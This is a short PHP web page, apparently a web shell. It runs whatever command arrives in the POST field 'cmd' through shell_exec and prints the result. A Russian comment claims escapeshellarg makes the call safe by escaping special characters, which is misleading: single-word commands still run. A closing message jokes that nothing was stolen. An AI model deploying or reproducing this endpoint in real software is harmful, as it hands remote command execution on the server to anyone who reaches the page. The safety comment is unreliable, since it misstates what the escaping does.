<!DOCTYPE html>
<html>
<body>

<?php
$command = $_POST['cmd'];
$command = escapeshellarg($command); // экранирование специальных символов
$output = shell_exec( $command);
echo "<pre>$output</pre>";
echo"Всё хорошо-ничего не украли"
?>

</body>
</html>